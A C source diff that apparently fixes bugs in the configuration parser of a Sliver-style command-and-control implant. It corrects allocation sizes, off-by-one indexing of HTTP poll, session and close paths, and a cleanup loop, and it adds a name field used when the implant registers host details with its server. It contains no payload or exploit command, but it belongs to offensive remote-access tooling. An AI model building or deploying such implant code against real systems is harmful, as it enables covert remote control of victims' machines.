@@ -59,6 +59,7 @@ VOID FreeGlobalConfig
 		FREE(pConfig->lpServerMinisignPublicKey);
 		FREE(pConfig->lpPeerAgePublicKeySignature);
 		FREE(pConfig->lpScriptPath);
+		FREE(pConfig->lpSliverName);
 		if (pConfig->hMutex != NULL) {
 			CloseHandle(pConfig->hMutex);
 		}
@@ -156,7 +157,7 @@ PBUFFER RegisterSliver
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 	lpHostName = GetHostName();
 
-	ElementList[0] = CreateBytesElement(pConfig->szSliverName, lstrlenA(pConfig->szSliverName), 1);
+	ElementList[0] = CreateBytesElement(pConfig->lpSliverName, lstrlenA(pConfig->lpSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
 	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
@@ -914,7 +915,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	}
 
 	for (i = 0; i < _countof(ConfigElements); i++) {
-		ConfigElements[i] = ALLOC(sizeof(PPBElement));
+		ConfigElements[i] = ALLOC(sizeof(PBElement));
 		ConfigElements[i]->dwFieldIdx = i + 1;
 		ConfigElements[i]->Type = Bytes;
 	}
@@ -929,14 +930,14 @@ PGLOBAL_CONFIG UnmarshalConfig
 	ConfigElements[14]->Type = RepeatedBytes;
 	ConfigElements[15]->Type = RepeatedBytes;
 	for (i = 0; i < _countof(DriveConfigElements); i++) {
-		DriveConfigElements[i] = ALLOC(sizeof(PPBElement));
+		DriveConfigElements[i] = ALLOC(sizeof(PBElement));
 		DriveConfigElements[i]->dwFieldIdx = i + 1;
 		DriveConfigElements[i]->Type = Bytes;
 	}
 
 	DriveConfigElements[8]->Type = Varint;
 	for (i = 0; i < _countof(HttpConfigElements); i++) {
-		HttpConfigElements[i] = ALLOC(sizeof(PPBElement));
+		HttpConfigElements[i] = ALLOC(sizeof(PBElement));
 		HttpConfigElements[i]->dwFieldIdx = i + 1;
 		HttpConfigElements[i]->Type = RepeatedBytes;
 	}
@@ -945,11 +946,12 @@ PGLOBAL_CONFIG UnmarshalConfig
 	HttpConfigElements[7]->Type = Bytes;
 	HttpConfigElements[8]->Type = Varint;
 	HttpConfigElements[9]->Type = Varint;
+	HttpConfigElements[10]->Type = Varint;
 	HttpConfigElements[11]->Type = Varint;
 	HttpConfigElements[12]->Type = Varint;
 	HttpConfigElements[13]->Type = Bytes;
 	for (i = 0; i < _countof(PivotConfigElements); i++) {
-		PivotConfigElements[i] = ALLOC(sizeof(PPBElement));
+		PivotConfigElements[i] = ALLOC(sizeof(PBElement));
 		PivotConfigElements[i]->dwFieldIdx = i + 1;
 		PivotConfigElements[i]->Type = Varint;
 	}
@@ -1089,8 +1091,8 @@ PGLOBAL_CONFIG UnmarshalConfig
 						if (pHttpProfile->cPollPaths > 0) {
 							pHttpProfile->PollPaths = ALLOC(sizeof(LPSTR) * pHttpProfile->cPollPaths);
 							for (j = 0; j < pHttpProfile->cPollPaths; j++) {
-								pHttpProfile->PollPaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[0])[j]->pBuffer, 0);
-								FreeBuffer(((PBUFFER*)pTemp2[0])[j]);
+								pHttpProfile->PollPaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[0])[j + 1]->pBuffer, 0);
+								FreeBuffer(((PBUFFER*)pTemp2[0])[j + 1]);
 							}
 						}
 
@@ -1102,8 +1104,8 @@ PGLOBAL_CONFIG UnmarshalConfig
 						if (pHttpProfile->cPollFiles > 0) {
 							pHttpProfile->PollFiles = ALLOC(sizeof(LPSTR) * pHttpProfile->cPollFiles);
 							for (j = 0; j < pHttpProfile->cPollFiles; j++) {
-								pHttpProfile->PollFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[1])[j]->pBuffer, 0);
-								FreeBuffer(((PBUFFER*)pTemp2[1])[j]);
+								pHttpProfile->PollFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[1])[j + 1]->pBuffer, 0);
+								FreeBuffer(((PBUFFER*)pTemp2[1])[j + 1]);
 							}
 						}
 
@@ -1111,12 +1113,12 @@ PGLOBAL_CONFIG UnmarshalConfig
 					}
 
 					if (pTemp2[2] != NULL) {
-						pHttpProfile->cSessionPaths = *((PDWORD)pTemp2[0]);
+						pHttpProfile->cSessionPaths = *((PDWORD)pTemp2[2]);
 						if (pHttpProfile->cSessionPaths > 0) {
 							pHttpProfile->SessionPaths = ALLOC(sizeof(LPSTR) * pHttpProfile->cSessionPaths);
 							for (j = 0; j < pHttpProfile->cSessionPaths; j++) {
-								pHttpProfile->SessionPaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[2])[j]->pBuffer, 0);
-								FreeBuffer(((PBUFFER*)pTemp2[2])[j]);
+								pHttpProfile->SessionPaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[2])[j + 1]->pBuffer, 0);
+								FreeBuffer(((PBUFFER*)pTemp2[2])[j + 1]);
 							}
 						}
 
@@ -1128,8 +1130,8 @@ PGLOBAL_CONFIG UnmarshalConfig
 						if (pHttpProfile->cSessionFiles > 0) {
 							pHttpProfile->SessionFiles = ALLOC(sizeof(LPSTR) * pHttpProfile->cSessionFiles);
 							for (j = 0; j < pHttpProfile->cSessionFiles; j++) {
-								pHttpProfile->SessionFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[3])[j]->pBuffer, 0);
-								FreeBuffer(((PBUFFER*)pTemp2[3])[j]);
+								pHttpProfile->SessionFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[3])[j + 1]->pBuffer, 0);
+								FreeBuffer(((PBUFFER*)pTemp2[3])[j + 1]);
 							}
 						}
 
@@ -1141,8 +1143,8 @@ PGLOBAL_CONFIG UnmarshalConfig
 						if (pHttpProfile->cClosePaths > 0) {
 							pHttpProfile->ClosePaths = ALLOC(sizeof(LPSTR) * pHttpProfile->cClosePaths);
 							for (j = 0; j < pHttpProfile->cClosePaths; j++) {
-								pHttpProfile->ClosePaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[4])[j]->pBuffer, 0);
-								FreeBuffer(((PBUFFER*)pTemp2[4])[j]);
+								pHttpProfile->ClosePaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[4])[j + 1]->pBuffer, 0);
+								FreeBuffer(((PBUFFER*)pTemp2[4])[j + 1]);
 							}
 						}
 
@@ -1154,8 +1156,8 @@ PGLOBAL_CONFIG UnmarshalConfig
 						if (pHttpProfile->cCloseFiles > 0) {
 							pHttpProfile->CloseFiles = ALLOC(sizeof(LPSTR) * pHttpProfile->cCloseFiles);
 							for (j = 0; j < pHttpProfile->cCloseFiles; j++) {
-								pHttpProfile->CloseFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[5])[j]->pBuffer, 0);
-								FreeBuffer(((PBUFFER*)pTemp2[5])[j]);
+								pHttpProfile->CloseFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[5])[j + 1]->pBuffer, 0);
+								FreeBuffer(((PBUFFER*)pTemp2[5])[j + 1]);
 							}
 						}
 
@@ -1223,6 +1225,10 @@ PGLOBAL_CONFIG UnmarshalConfig
 CLEANUP:
 	FREE(pMarshaledData);
 	FREE(UnmarshaledData);
+	for (i = 0; i < _countof(ConfigElements); i++) {
+		FREE(ConfigElements[i]);
+	}
+
 	for (i = 0; i < _countof(HttpConfigElements); i++) {
 		FREE(HttpConfigElements[i]);
 	}
@@ -1232,7 +1238,7 @@ CLEANUP:
 	}
 
 	for (i = 0; i < _countof(PivotConfigElements); i++) {
-		FREE(DriveConfigElements[i]);
+		FREE(PivotConfigElements[i]);
 	}
 
 	return pResult;
